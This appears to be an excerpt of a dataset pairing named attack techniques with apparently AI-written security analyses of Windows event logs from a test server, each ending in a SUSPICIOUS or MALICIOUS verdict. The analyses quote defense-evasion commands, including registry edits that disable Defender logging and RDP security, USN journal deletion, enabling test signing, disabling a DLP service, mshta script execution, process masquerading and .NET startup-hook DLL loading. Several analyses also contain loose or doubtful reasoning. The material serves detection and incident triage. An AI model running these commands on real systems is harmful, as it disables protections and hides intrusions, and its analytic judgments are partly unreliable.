  - Conduct a thorough investigation into the activities initiated by `admin_test`, including establishing the authenticity of the user and checking for signs of account compromise.
  - Examine other systems for similar registry modifications or login/logon behaviors that could indicate a wider attack or compromise within the network.
  - Ensure endpoint protections and monitoring solutions are configured to alert on such registry changes and unusual privilege usage in the future.

**Final Resolution: MALICIOUS** - These logs contain specific indicators of compromise, notably registry hijacking tactics combined with anomalous privileged operations that are consistent with malicious actions. It's crucial to perform a timely and comprehensive incident response."
Modify EnableBDEWithNoTPM Registry entry,"Upon analyzing the provided logs, several activities were noted:

1. **Time Manipulation Events**:
   - Multiple entries for time adjustments are seen in both Kernel-General and Security-Auditing logs. While these entries by themselves could be benign (such as adjustments related to daylight saving time changes or time synchronization), it is noteworthy due to potential misuse for seeding backdoors or evading detection methods.

2. **Registry Modification**:
   - A suspicious execution of `cmd.exe` to modify the registry was observed:
     ```
     CommandLine: ""cmd.exe"" /c reg add ""HKLM\SOFTWARE\Policies\Microsoft\FVE"" /v EnableBDEWithNoTPM /t REG_DWORD /d 1 /f
     ProcessId: 4116 
     ```
   - The registry change to enable BitLocker without TPM indicates an attempt to bypass certain security checks, which is highly suspicious.

3. **Unusual Process Executions**:
   - There were numerous executions of `MicrosoftEdgeUpdate.exe` processes with various command-line arguments. This might be a normal software update process. However, given the context of the machine and how other tools might be used to cloak malicious activities, this needs attention.

4. **Execution of `whoami.exe`, `hostname.exe`, and `conhost.exe`**:
   - These processes were executed by the user `SERVER002\admin_test`. While these could be benign or legitimate investigative commands, the presence alongside canonical names like `cmd.exe` and registry edits could suggest a user profiling or reconnaissance phase, which is typically used in lateral movement or persistence stages of an attack.

Due to the registry modification event and suspicious execution patterns in a high-profile machine such as the CEO's, there are indicators that warrant concern.

**Assessment: SUSPICIOUS**

- **Guidance**: 
  - Further investigation is necessary to ensure the security integrity of the system. Specifically:
    - Review changes made to the registry, especially those involving security settings like BitLocker.
    - Investigate the user-facing applications that might run under processes similar to `MicrosoftEdgeUpdate.exe` to determine legitimacy.
    - Monitor for any additional unexpected time changes as these can correlate to stealth or obfuscation tactics used by malicious actors.
    - Consider deploying additional endpoint investigations or forensic analysis to rule out compromise or advanced persistent threats (APTs).
    - Review all command-line activities by the user to decipher legitimacy and also inspect any correlated network logs for unauthorized data exfiltration."
Code Signing Policy Modification,"Upon reviewing the provided Windows event logs from the CEO's machine (Server002), the following analysis is made:

### Analysis:
1. **System Log:**
   - There are events related to time changes (`EventID: 24` and `EventID: 1`) indicating a minor adjustment of the system's time by the service `svchost.exe`. This could be routine time synchronization adjustments by Windows Time Service and isn't inherently malicious.

2. **Sysmon Log:**
   - Multiple instances of normal system processes such as `wevtutil.exe`, `conhost.exe`, `whoami.exe`, and `cmd.exe` are being executed by the `SERVER002\\admin_test` user. These processes are typical in a Windows environment; however, the instantiation of `cmd.exe` with command `bcdedit /set testsigning on` is unusual as it changes the boot configuration to allow test signing on the system, which is generally used for driver development or debugging. This command can be potentially risky if not intended, as enabling test signing can allow unsigned or self-signed drivers to be loaded.
   - Numerous entries relate to `Microsoft Edge Update` processes (`MicrosoftEdgeUpdate.exe`), which involve typical software update and service registration activities. These actions occur under the `NT AUTHORITY\\SYSTEM` account and align with normal background operations for maintaining up-to-date software.

3. **Application Log:**
   - Logs simply indicate the stopping of EdgeUpdate services, consistent with routine service management operations often seen during application updates.

4. **Security Log:**
   - Log entries related to `EventID: 4616` correlate with the time adjustment, confirming the operations as part of normal Windows functioning.

### Conclusion:
- The execution of `bcdedit /set testsigning on` could suggest a need for further investigation due to its implications on system security if not executed for a legitimate purpose, e.g., hardware driver development, especially on a high-value asset like the CEO's machine.
- Aside from this anomaly, the rest of the log entries do not indicate direct malicious activity and reflect routine operations regarding time synchronization and software updates.

### Resolution:
- **SUSPICIOUS**: The logs demonstrate one notably suspicious activity with the `bcdedit /set testsigning on` command that requires further investigation to determine legitimacy. It is essential to verify if this action was authorized and necessary for business purposes. Ensure that the security team reviews additional context or runs checks for unauthorized changes to system configurations."
Indicator Removal using FSUtil,"Upon reviewing the provided log entries, there are several points of interest that warrant further attention to determine their nature.

### Key Findings:

1. **Unusual Command Execution:**
   - The event involving `cmd.exe` executing the command `fsutil usn deletejournal /D C:` is an area of high concern. This command deletes the USN change journal, a log used by the NTFS file system. It is often targeted by attackers to hide traces of file metadata changes. This kind of action is unusual and can be indicative of malicious intent.

2. **Background Activities:**
   - The presence of numerous Sysmon logs indicating the execution of processes like `wevtutil.exe` and `conhost.exe` is noted, but generally, these are legitimate system utilities. Frequent execution in a short period by `SERVER002\\admin_test` could indicate automation or scripting, either by legitimate administrative actions or potentially by a script running suspiciously.

3. **Use of Windows Utilities:**
   - `fsutil.exe` is generally used by system administrators. However, when combined with the process logs, `whoami.exe` and `hostname.exe` may be used for reconnaissance after gaining initial access. The rapid sequence execution also raises questions about potential automation.

4. **Logon Events and Privileged Use:**
   - The logs contain entries indicating recurring SYSTEM logons and privilege use (`SeDebugPrivilege` among others). While these entries can be normal for certain background services, when viewed alongside the journal deletion, they suggest potential misuse.

5. **Security Context:**
   - Security logs mostly show standard authentication and privileged rights assignments, but the use pattern should be reviewed in the context of existing baselines for the CEO's machine usage.

### Assessment:

- **SUSPICIOUS:** The logs contain potentially suspicious activity related to the deletion of the NTFS journal using `fsutil usn deletejournal` and rapid multiple executions of system functions. These actions are not typical for standard operating procedures and could indicate malicious behavior if not corroborated with known administrative actions or maintenance tasks.

### Guidance on How to Proceed:

1. **Verification Procedures:**
   - Confirm if there was any legitimate maintenance or administrative activity logged officially around the time of these events.
   - Review the EDR alerts and correlate with known baselines or whitelists to rule out false positives.

2. **Further Investigation:**
   - Investigate the origin and intent behind the `fsutil usn deletejournal` command execution. Check for any unauthorized physical or remote access which might have led to this command's execution.
   - Conduct a detailed analysis of any other machines that `admin_test` or similar accounts have accessed recently for potentially similar patterns.

3. **Incident Response:**
   - If not accounted for by legitimate activities, escalate this incident in accordance with your organization's incident response plan.
   - Consider isolating the affected system(s) for forensic imaging and analysis to establish a timeline of activities.

4. **Audit and Review:**
   - Enhance logging and monitoring to include more comprehensive Sysmon rules and PowerShell script block logging.
   - Review user access privileges and monitor for similar patterns in other high-profile employee accounts.

This investigation indicates that while there is no concrete evidence of active compromise, the actions noted seem suspicious and merit further investigation to ensure no malicious activities are ongoing or have occurred."
Disable Remote Desktop Security Settings Through Registry,"Based on the provided Windows event logs, here is an analysis for suspicious or malicious activity:

### Detailed Analysis:

1. **Time-Change Events:**
   - Both Security logs (Event ID: 4616) and System logs (Event ID: 1) indicate frequent time adjustments by svchost.exe, which is unusual. Time manipulation might be linked with attempts to alter log timestamps, a common evasion technique used in attacks.

2. **Privileged Logons:**
   - Multiple events with Event ID 4624 show logon type 3 (network), which is typical. However, the username `admin_test` being logged in with elevated privileges (Event ID 4672) and granted privileges such as `SeDebugPrivilege`, `SeTakeOwnershipPrivilege`, etc., can be exploitative if the user's normal behavior doesn't justify these privileges.
  
3. **Unusual Process Execution:**
   - A series of Sysmon logs (Event ID: 1 and 5) capture processes such as `cmd.exe` and `reg.exe` altering the registry with commands that disable security settings, specifically:
     - `""reg add \""HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows NT\\Terminal Services\"" /v \""DisableSecuritySettings\"" /t REG_DWORD /d 1 /f""`
   - This behavior is highly suspicious as it implies local policy changes that could weaken system security, potentially aiding in persistence or later exploitation phases.

4. **Processes Executed by Admin_Test:**
   - The user `SERVER002\\admin_test` is linked to the running of utility processes such as `wevtutil.exe` and `conhost.exe` multiple times, and these seem to be preceded by execution of `hostname.exe` and `whoami.exe`. Such reconnaissance and logging utility usage can be consistent with an intruder's activity.

5. **Network Connections:**
   - There are two logon events (Event ID: 4624) from `NtLmSsp` authenticated via `NTLM` showing logins from two different IPs (`192.168.0.102` and `fe80::e3b5:5371:12a8:9c77`). If these IP addresses are unusual for this user or system, they can indicate unauthorized external access.

### Assessment:

- **Time manipulation**, **privilege escalation**, **execution of processes to weaken system security**, and the **suspicious activity around the user `admin_test`** raise red flags. 
- The modifying of registry settings to potentially disable security is concerning and indicative of malicious intent.
- The consistent use of system utilities in a manner consistent with reconnaissance or log alteration is also a sign of compromise.

### Resolution:

- **MALICIOUS**: The activities logged, particularly the registry alteration, level of privilege used, and potential time-stamp manipulation, clearly point towards malicious activity. Immediate response actions should be initiated.

### Guidance:

1. **Immediate Actions:**
   - Isolate the affected system from the network to prevent further malicious actions.
   - Perform a detailed forensic analysis on the machine to understand the extent of the compromise.
   - Change the passwords for any accounts that might have been compromised.
   
2. **Further Investigation:**
   - Verify whether `admin_test` is a legitimate account and if the actions conducted match known behavior for this user.
   - Review recent changes or known issues regarding time synchronization policies or settings.
   - Assess network traffic for any unusual external connections that might be tied to this activity.

3. **Recovery and Remediation:**
   - Restore registry and system settings to a secure state.
   - Review and potentially enhance security and monitoring configurations to prevent similar incidents.
   - Update EDR rules to detect similar patterns in the future and conduct thorough employee security training to reinforce good security practices."
WINWORD Remote Template Injection,"Based on the provided logs, here's a detailed analysis:

1. **Application Log:**
   - The log entry from `Microsoft-Windows-Security-SPP` indicates a routine operation from the Software Protection Platform Service, which is not suspicious or indicative of malicious activity.

2. **Security Log:**
   - Events with ID 4616 from `Microsoft-Windows-Security-Auditing` indicate changes in system time. This can be a result of legitimate activity like a time correction due to synchronization with an NTP server. The process involved is `svchost.exe`, a common Windows process which, in this context, raises no immediate red flags.

3. **Sysmon Log:**
    - Multiple log entries indicate the execution of various processes like `wevtutil.exe`, `conhost.exe`, `hostname.exe`, `whoami.exe`, and `cmd.exe`, often by the user `SERVER002\\admin_test` with a high-integrity level. 
    - The `cmd.exe` process is invoked with a suspicious command line: `""cmd.exe"" /c start ""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\data\\src\\Calculator.docx""`. This indicates an attempt to open what is expected to be a Word document using the `start` command. The presence of an unexpected script or macro within such a file could be indicative of malicious activity, especially given the location in a temporary directory.
    - The series of processes involving `wevtutil.exe`, a command-line tool for managing event logs, without context or details for further commands is somewhat suspicious but not conclusively malicious by themselves.
    - The combination of `whoami.exe` and command execution via `cmd.exe` can sometimes be used by attackers during reconnaissance or lateral movement activities within a compromised environment.

4. **System Log:**
   - Adjustments to the system time captured in the logs appear to align with NTP synchronization tasks.

**Assessment and Conclusion:**
The presence of benign operating system processes such as `svchost.exe`, `whoami.exe`, and routine system time updates are not inherently malicious. However, the execution of `cmd.exe` to open a document from a temporary directory is unusual and potentially risky, especially if the document is weaponized with a script or macro.

Given the context, it is prudent to be cautious. Therefore, the resolution for this analysis is **SUSPICIOUS**. The activity requires further investigation to determine the legitimacy of the opened document and any potential actions executed upon its opening. Affected systems should be checked for indicators of compromise related to document-based attacks, unauthorized command executions, or reconnaissance activities."
SyncAppvPublishingServer Signed Script PowerShell Command Execution,"### Analysis of Log Entries

Upon reviewing the provided logs, I've identified several key points that are worth discussing:

#### Application Log
- The log shows normal operations related to Windows Defender being in an ""SECURITY_PRODUCT_STATE_ON"" state.
- Edge Update services being stopped may raise a question, but without further context, stopping services itself isn't inherently malicious. Such activities are typically seen during routine updates or shutdowns.

#### Windows PowerShell Log
- No entries were provided, so no analysis is possible for this section.

#### Security Log
- **Event ID 4624**: A logon event for the SYSTEM account, with a logon type of 5 (service start). This appears to be a standard background process operation.
- **Event ID 4672**: Special privileges were assigned to the SYSTEM account, which is typical behavior.
- **Event ID 5379**: Multiple failed credential access attempts for a Microsoft Account and Windows Live Token. The repetition and nature of these could imply an account enumeration attempt or testing for valid credentials.
- **Event ID 4798**: Directory services enumeration indicating queries for user accounts like ""Administrator"", ""admin_test"", ""Guest"", etc. While this may represent a legitimate activity, it can also suggest reconnaissance attempts.

#### Sysmon Log
- The execution of `whoami.exe` and `hostname.exe` by the ""admin_test"" user could be normal checking of system information but could also indicate someone investigating the environment.
- Execution of `cmd.exe` by the user running a script that launches `calc.exe` through the argument `Start-Process calc`. While spawning `calc.exe` isn't inherently malicious, using scripts to execute commands could often signify attempts at initial access or exploration.
- Frequent appearance of Edge update processes align with normal software update processes, but their high frequency may overshadow potentially suspicious behavior without further unusual context.

### Assessment of the Situation

Based on the available data:
- The account enumeration observed and repeated failed logon attempts could signal preparatory steps for unauthorized access attempts.
- The execution of seemingly benign commands may be consistent with red team activity or initial stages of a reconnaissance effort.
- However, given there are no concrete indications of a successful compromise or explicitly malicious software or commands executed, it falls into a gray area.

### Resolution

**SUSPICIOUS**

- The activities logged, particularly around credential access attempts and user/process enumeration, suggest there is a need for further investigation.
- Additional logs should be requested for more extended time periods and more context should be gathered around recent user activities or scheduled tasks involving the account ""admin_test"" on the server.

### Guidance on How to Proceed
- Conduct a detailed review of user account activities related to ""admin_test"".
- Corroborate with network logs to identify any potential connections or command-and-control attempts around this timeframe.
- Interview the user or review policies related to the usage of administrative accounts to check for any legitimate explanations.
- Consider enhancing monitoring on this server for any anomalous command executions or spikes in service-account activities."
Disable Windows Notification Center,"In analyzing the provided Windows event logs, here is a detailed breakdown of suspicious or malicious activities:

1. **Process Execution with Command Arguments:**
   - **EventID 17979 and 17981 (Sysmon Log):** `cmd.exe` executes a command to modify the registry key `HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\Windows\Explorer`. The command-line argument adds a `REG_DWORD` value intended to disable the notification center on the system. This kind of behavior could be suspicious as it indicates potential unauthorized system configuration changes.
   - **EventID 17985 (Sysmon Log):** `MicrosoftEdgeUpdate.exe` is executed with complex command-line arguments, which include a very long and detailed XML-like text. This behavior might appear typical for legitimate updates or telemetry but should be verified against standard practices in the organization.
   
2. **Registry Manipulation:**
   - The registry modification by the `cmd.exe` as seen in previous logs might be benign if intended by an admin, but its occurrence warrants further investigation, particularly if the `admin_test` account wasn’t directly involved in implementing this change.

3. **System Time Changes:**
   - **Security EventID 4616 (Security Log):** Shows the system time was altered. Changes in system time can be a technique used by attackers to evade timestamp-based logging and detection systems.

4. **High Integrity Level Processes:**
   - Processes like `whoami.exe`, often part of normal operations, especially from an admin account, can be used in post-exploitation phases for enumeration purposes, necessitating the verification of legitimate use.
   
5. **Account and Process Context:**
   - The user `SERVER002\admin_test` is seen repeatedly executing processes with high levels of privileges. If this is unexpected or unauthorized use of an admin account, it could imply compromised credentials or misuse.

**Assessment and Resolution:**
- **SUSPICIOUS:** The combination of registry modification, system time changes, and high integrity level processes being executed by an administrator account indicate activity that doesn't look right and requires further investigation.

**Guidance on How to Proceed:**
1. **Confirm the Legitimacy of Registry Changes:** Verify with IT if the registry changes were planned activities for system configuration.
2. **Review User Account Activity:** Examine login patterns and the context around `admin_test` operations to confirm legitimacy.
3. **Check for Anomalous System Time Changes:** Verify whether the time changes align with any other IT maintenance tasks.
4. **Scan for Threats:**
   - Conduct a thorough malware and threat assessment on the system using updated security tools.
   - Validate that installed software and applications (like Microsoft Edge Update) are trustworthy and unmodified.

Given these factors, you should maintain a high state of vigilance and ensure comprehensive auditing for this host and potentially other systems in the network."
UACME Bypass Method 59,"Based on the provided log entries, a detailed analysis of the logs reveals the following points of interest:

1. **Suspicious Command Line Execution:**
   - The `cmd.exe` and `powershell.exe` processes were executed with suspicious command lines. Particularly, the execution of `Akagi64.exe` from a temporary directory (`C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\..\\Externalfiles\\script\\59 Akagi64.exe`) raises concerns. The usage of file paths with short names and relative paths (including `..`) in temporary directories is generally suspicious behavior, often associated with attempts to obfuscate the real actions being performed.

2. **Integrity Level:**
   - The command executions are occurring at a ""High"" integrity level, which indicates that if these commands were potentially malicious, they would have the capacity to execute with elevated privileges.
   
3. **Security Implications of Process Execution:**
   - Execution of several system utilities (`cmd.exe`, `wevtutil.exe`, `whoami.exe`) is noted. While these can be legitimate for administrative tasks, they also could be part of reconnaissance or manipulation attempts if found under odd contexts.

4. **Frequent Edge Update Activity:**
   - The logs show frequent executions of Microsoft Edge Update components. While often legitimate, ensure it is part of the scheduled update cycle or sanctioned user activity. It’s important to rule out if any of these processes were spawned by unauthorized users or malware trying to disguise itself as genuine update operations.

5. **Overall Activity Context:**
   - The activities seem to cluster temporally, all revolving around system investigative commands and software updates. This clustering could either suggest a legitimate series of maintenance activities or a systematic exploration following a potentially malicious action.

Given the evidence from the Sysmon logs and the discovered anomalies, the activity presented in the logs leans towards the category of ""SUSPICIOUS."" The potential indicators, such as suspicious command-line executions and high-integrity level processes, need further investigation. It’s crucial to:
- Verify the legitimacy of each `Akagi64.exe` execution, including file sourcing, user authorization, and intent.
- Cross-reference system updates and scheduled tasks during this time frame.
- Investigate further into the role and timing of Microsoft Edge Update processes to confirm they match known benign update patterns.

**Resolution:** **SUSPICIOUS** - Logs contain activity that doesn't look right and needs more investigation.

As a next step, proactively isolate the actions observed and correlate with user behaviors and known safe system operations. Consider employing threat hunting techniques to discern if this behavior pattern matches any known threat actors or attack vectors, and ensure that endpoint protection mechanisms are appropriately configured and updated."
"DLL Search Order Hijacking,DLL Sideloading Of KeyScramblerIE.DLL Via KeyScrambler.EXE","Upon analyzing the provided event logs, the following assessments were made regarding the suspicious or potentially malicious activities:

1. **PowerShell Activity**:
   - Multiple PowerShell events were logged. The PowerShell script executed includes steps to download ""KeyScrambler_Setup.exe"" from an official site, install it silently, and perform some operations involving DLL files. The script description hints at misuse potential with a modified DLL.
   - The script moves the executable to a temporary directory to avoid permission issues, which can be a technique used in Living Off the Land (LotL) attacks.
   - The processes involved with PowerShell were executed under high integrity by the user ""SERVER002\\admin_test"".

2. **Sysmon Activity**:
   - The Sysmon logs show the sequential execution of processes such as `conhost.exe`, `wevtutil.exe`, and `regsvr32.exe`, which are commonly used in legitimate operations but can be exploited in attack techniques, particularly when registering or unregistering DLLs provided with unwanted scripts.
   - A notable observation is the registration operations via `regsvr32.exe` for `KeyScramblerIE.dll` which could imply alteration or misuse.

3. **Scheduled and Time-Related Events**:
   - The Windows Time service was synchronized close to the events' occurrence. A legitimate system adjustment occurs; however, this could also align with scheduling malware activities to blend with system tasks.

4. **Application and Edge Update Logs**:
   - Logs from ""Microsoft Edge Update"" and EdgeUpdate.exe show repetitive activity related to service restarts. This seems consistent with regular update checks.

5. **Security and System Logs**:
   - No explicit unauthorized access or privilege escalation events were logged in the Security logs.

### **Assessment and Conclusion**:
- The logged series of events indicate processes associated with software installation scripts that could be used maliciously, especially with KeyScrambler's possible DLL-related misuse.
- While the activity regarding the KeyScrambler software might aim to be benign in its stated application, the context suggests potential script misuse and involves operations typically exploited in DLL hijacking or injection attacks.

Thus, the overall conclusion is marked as:

**SUSPICIOUS**: While not definitively malicious, the events contain activity that warrants further investigation to confirm legitimacy and absence of tampered DLLs or system compromise potential.

### **Guidance on How to Proceed**:
- **Isolation and Review**: Isolate the system ""Server002"" to prevent potential lateral movement.
- **Deep Dive Analysis**: Conduct a forensic analysis of the downloaded and installed KeyScrambler files, focusing on hashes and DLL legitimacy.
- **Log Correlation**: Cross-reference the network connections and other system interactions during this period for anomalies.
- **Engagement with Personnel**: Verify with IT if any legitimate installations via such PowerShell scripts were authorized.
- **Tool Implementation**: Consider implementing more stringent endpoint protections to monitor and control script-based installation methods."
Mshta executes VBScript to execute malicious command,"### Analysis of Logs

#### Suspicious/Anomalous Behavior:

1. **Process Execution and Command-Line Arguments:**
   - The execution of `cmd.exe` with the command line `cmd.exe /c mshta vbscript:Execute(...)` is highly suspicious. This technique is often associated with attempts to execute PowerShell scripts in ways that can bypass certain defenses, commonly seen in attack vectors involving lateral movement or exploitation.
   - The PowerShell script mentioned (`C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\data.005\\src\\powershell.ps1`) run through `mshta.exe` suggests script-based execution that could be part of a more complex attack.

2. **Privilege Escalation:**
   - User `SERVER002\\admin_test` is involved in triggering several processes that generally require administrative privileges, noted with elevated tokens intended for privileged operations.

3. **Repetitive Executions:**
   - Instances of `wevtutil.exe` and `conhost.exe` being repeatedly launched is unusual and typically related to inspecting or tampering with event logs, which can be indicative of someone attempting to cover tracks.

4. **Time Manipulation:**
   - There is a time change anomaly indicated by several `Microsoft-Windows-Kernel-General` logs and subsequent `Security-Auditing` entries. These could be normal, but they are also suspicious, as attackers might alter system time during their operations for various reasons, including bypassing certain time-based security mechanisms or causing confusion in log analysis.

#### Indicators of Malicious Activity:

- **The use of `mshta.exe` and PowerShell**: Often used by malicious actors to execute scripts in an obfuscated way, commonly seen in malware attacks.
- **The IP Address Logon from 192.168.0.102 using NTLM**: This could indicate an unusual or unauthorized remote access attempt using NTLM authentication—which is not typically preferred due to its vulnerabilities.

### Assessment:

Based on the analysis of the provided logs, significant indicators of potential compromise are identified, particularly:
- **The chain of command-line executions (using `mshta`, `cmd`, and `PowerShell`) is a hallmark of obfuscation or evasion tactics utilized by adversaries to execute malicious payloads.**

### Resolution:

- **MALICIOUS**: The activity observed contains enough suspicious patterns and methods typically employed in a cyber attack, suggesting malicious intent.

5. **Notification:**
   - Inform the relevant security teams and if necessary, senior leadership about the breach to plan a robust defensive response, including potential communications with stakeholders if data is compromised.

By taking these steps, the security of the organization can be assured, while lessons learned can facilitate detection and prevention of future incidents."
Disable Arbitrary Security Windows Service,"Upon reviewing the provided Windows event logs, several points of potentially suspicious activity have been identified, prompting further scrutiny:

### Suspicious or Anomalous Behavior

1. **Unusual Command Execution:**
   - The execution of `cmd.exe` with command-line arguments indicating attempts to stop and disable the `McAfeeDLPAgentService` is concerning. McAfee DLP is a critical data loss prevention tool, and attempts to disable it could imply an attempt to bypass security measures (`event ID: 17983`).
   - Command: `""cmd.exe"" /c net.exe stop McAfeeDLPAgentService & sc.exe config McAfeeDLPAgentService start= disabled`

2. **User Activity:**
   - The user `""SERVER002\\admin_test""` is associated with multiple process creations involving utilities like `wevtutil.exe`, `conhost.exe`, `cmd.exe`, and `sc.exe`. This pattern can be indicative of a user trying to manage or manipulate system services and logs, potentially to cover tracks.
   - The use of `whoami.exe` by this user (`event ID: 17979`) suggests actions to verify user permissions, which is a common step in many post-compromise scenarios.

3. **Time Manipulation:**
   - There are events indicating changes in system time (`System log Event ID: 3570`) without clear justification. Time manipulation can be used to disturb log files and timestamps, which may suggest malicious objectives.

### Indications of Potential Compromise

- Disabling security-related services like `McAfeeDLPAgentService` is generally regarded as a malicious activity, especially if performed without justification.
- The pattern of system command usage alongside service modifications by a potentially unauthorized or a misconfigured admin account raises red flags concerning possible unauthorized access and malicious intent.

### Assessment and Recommendations

Assessment concludes that the activity logged within this timeframe on `Server002` does exhibit some red flags that are indicative of malicious intent, specifically due to attempts to disable a security-critical service and time changes that can manipulate logs.

**Resolution: MALICIOUS**

### Recommendations:

1. **Immediate Security Measures:**
   - Verify the integrity and current configuration of the McAfee DLP service and re-enable/enforce it if necessary.
   - Review the permissions and recent activity of `SERVER002\\admin_test` to ensure that this account is valid and not compromised.

2. **Incident Response:**
   - Perform a deeper investigation into systems that accessed . user`admin_test`, focusing on any unauthorized access that might have occurred.
   - Conduct further threat hunting activities to determine if other systems are affected similarly.

3. **Monitoring and Detection:**
   - Increase monitoring on all critical systems for similar commands and user behaviors.
   - Implement alerts for sudden changes in service configurations, particularly around security services.

4. **Review and Update Policies:**
   - Ensure policies are in place to alert administrators when critical security tools are stopped or reconfigured without proper change management procedures.

These measures should help contain any potential threats and prevent future occurrences of similar activities."
LockBit Black - Disable the ETW Provider of Windows Defender -Powershell,"After analyzing the provided Windows event logs, the following observations and assessments can be made regarding potential indicators of malicious activity:

### Suspicious Behavior
1. **PowerShell Execution Modification (Windows PowerShell Log):** 
   - The PowerShell logs indicate that a script was executed to modify a registry key related to the Windows Defender Operational log (`""HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\WINEVT\\Channels\\Microsoft-Windows-Windows Defender/Operational\"" -Name Enabled -PropertyType DWord -Value 0 -Force`). Disabling security software logging is a common tactic used by attackers to obscure their tracks.

2. **Repeated Usage of Potentially Malicious Tools (Sysmon Log):** 
   - There are frequent and close-timestamped executions of system utilities like `wevtutil.exe` and `conhost.exe`, primarily by the `SERVER002\\admin_test` user. This could indicate local collection or manipulation of event logs, a tactic often used during the post-exploitation phase.
   - The processes spawned such as `whoami.exe` and command-line use of `HOSTNAME.EXE` don't in themselves indicate compromise but could be indicative of enumeration activities if done repeatedly or exceptively.

### Legitimate or Benign Activity
1. **Time Synchronization and EdgeUpdate (System and Application Logs):**
   - System time synchronization via `time.windows.com`, and standard EdgeUpdate logs, seem characteristic of routine system and software maintenance activities. The Microsoft Edge Update process is well-documented and expected in Windows environments.

2. **High Volume of EdgeUpdate Events (Sysmon Log):** 
   - A large number of executions related to Microsoft Edge Update processes are listed, which, while noisy, correlate with routine system updates. It does not inherently indicate malicious activity unless there's evidence of tampering or unexpected modifications which aren't covered by the logs provided.

### Assessment
The logs provide substantial evidence of potentially suspicious activities, primarily around the use of PowerShell to manipulate the Windows Defender log settings and the use of system utilities like `wevtutil.exe` which could indicate attempts to clear or alter logs. These activities could align with tactics by adversaries seeking to maintain persistence while avoiding detection.

### Resolution: **SUSPICIOUS**

Given the potential for malicious activity, particularly the PowerShell usage to disable security logs, the patterns observed in system utility usage by a non-system account, and the lack of explicit evidence of malicious payload execution, this scenario requires further investigation. It is not conclusively malicious due to inherent legitimate usage contexts for some tools observed.

### Guidance on How to Proceed
1. **Immediate Actions:**
   - **Investigate the Account `SERVER002\\admin_test`:** Verify the legitimacy of this user and whether such activities align with the expected behavior for this account's role.
   - **Review System Integrity:** Check system and file integrity (e.g., integrity hash checks) for any evidence of tampering.
   - **Inspect Network Traffic:** Look for any unusual outbound connections, especially during the time these events were logged.

2. **Long-term Actions:**
   - **Enhance Monitoring:** Increase monitoring of this host and surrounding network traffic, focusing on PowerShell usage and logs clearing attempts.
   - **Conduct Security Awareness Training:** Educate employees on the risks of improper use of administrative accounts.

By conducting these follow-up actions, you can ensure any potential risks are mitigated, and legitimate activity is confirmed or disproven effectively."
DLL Side-Loading using the dotnet startup hook environment variable,"Upon reviewing the provided event logs, several observations can be made based on the entries related to process executions, system tasks, and service changes. Here's a detailed analysis of the logs:

### Detailed Analysis:

1. **Microsoft Edge Update Activity**:
   - Several instances of `MicrosoftEdgeUpdateComRegisterShell64.exe`, `MicrosoftEdgeUpdate.exe`, and associated processes are observed in the logs (EventIDs: 17996, 18002, 18030, 18034, etc.). These processes are executing binary updates, registering components, and interacting with the system under `NT AUTHORITY\SYSTEM` user account.
   - The processes appear to be related to a legitimate software update cycle for Microsoft Edge. The command lines and the parent processes indicate routine operations concerning software update mechanisms. 

2. **Use of High Integrity Level**:
   - Most of the processes run at a `High` or `System` integrity level, which is typical for system update operations and administrative tasks. While this is expected for legitimate system operations, any anomalous behavior or unauthorized use at such levels would be concerning. In this context, the activities align with software update routines.

3. **PowerShell and Command Line Executions**:
   - The log entries include instances of PowerShell and Command Prompt executions by the user `SERVER002\\admin_test`. No specific malicious scripts or commands are discerned due to the lack of detailed command-line arguments in the logs.
   - A suspicious command involving `cmd.exe /c set DOTNET_STARTUP_HOOKS` with a reference to a `preloader.dll` (EventID: 18030) stands out. This command is associated with the manipulation of .NET startup behavior, which can be benign if related to developer setups but could indicate a malicious preload DLL injection or attempt to hijack a startup hook.

4. **Execution of Diagnostic and Identity Tools**:
   - Processes such as `whoami.exe` and `hostname.exe` are seen being executed, which are native Windows utilities for network and user information gathering. These are common for diagnostic purposes but could also be used in internal reconnaissance if not typical behavior from the executing user.

5. **Repeated Execution of `wevtutil.exe`**:
   - `wevtutil.exe` is executed multiple times (EventIDs: 18003, 18007, etc.). This utility is used to manage event logs, and repeated usage might suggest attempts to query or modify event logs. Considering the context and lack of additional malicious indicators, such use is suspicious without further context.

### Assessment and Resolution:

Given the information available, the primary concern arises from the uncommon usage of the `.NET Startup Hooks` setting with the `cmd.exe` and the repeated execution of `wevtutil.exe`. This combined with the typical administrative tasks could indicate potential testing or suspicious configuration changes.

- **Resolution**: **SUSPICIOUS**

#### Recommended Actions:

- **Further Investigation**:
  - Investigate the origin and context of the `preloader.dll` executed using .NET startup hooks to determine if it's legitimately part of development work or potentially malicious.
  - Review the use of `wevtutil.exe` in audit logs and determine if there have been any unauthorized clearing or queries.
  - Validate the legitimacy of processes performed under `SERVER002\\admin_test` and ensure this aligns with typical activity patterns for this user.
  
- **Monitoring and Detection**:
  - Implement tighter monitoring on processes executed with high integrity levels, especially for powershell and cmd.exe.
  - Consider implementing additional EDR rules to detect unusual `.NET Startup Hooks` usages.

- **User Awareness and Policy Enforcement**:
  - Ensure users are educated on security policies regarding command execution and system diagnostics tools. Encourage reporting of unexpected behaviors or requirements.

By taking these steps, you can mitigate possible risks and ensure further clarity on whether these activities are legitimate or potential indications of a compromise."
Malicious process Masquerading as LSM.exe,"Upon review of the provided Windows event logs, we can construct the following analysis:

### Security Log Analysis:
The logs of interest here are Event ID 5379, which pertain to Credential Manager operations. These events show repeated attempts by a system account (`SERVER002$`) to access credentials associated with a Microsoft account (`user=02txoixylodcstop`). Notably, all these attempts have a `ReturnCode` of `3221226021`, which typically means access is denied.

### Sysmon Log Analysis:
- **Event ID 1 (Process Creation)**: This part of the log reveals some concerning activity:

  1. **Process Creation - `cmd.exe`**: A command line is observed copying `cmd.exe` to `lsm.exe` and then executing `lsm.exe` with a command to create a file (`data.003.txt`). The act of copying `cmd.exe` to another executable and executing it under a different name (`lsm.exe`) is a classic technique used by attackers to bypass security controls or hide malicious activity.
  
  2. **Events involving `wmiprvse.exe` and `wevtutil.exe`**: While these indicate a normal service process, if correlated with unusual command usage or non-administrative users, it can be suspicious. However, this context requires threat-contextual data that we currently do not have.
  
  3. **`conhost.exe` and `whoami.exe` executions**: These processes are typical behavior seen during script executions or administrative commands, and by themselves are not overtly suspicious in this instance.

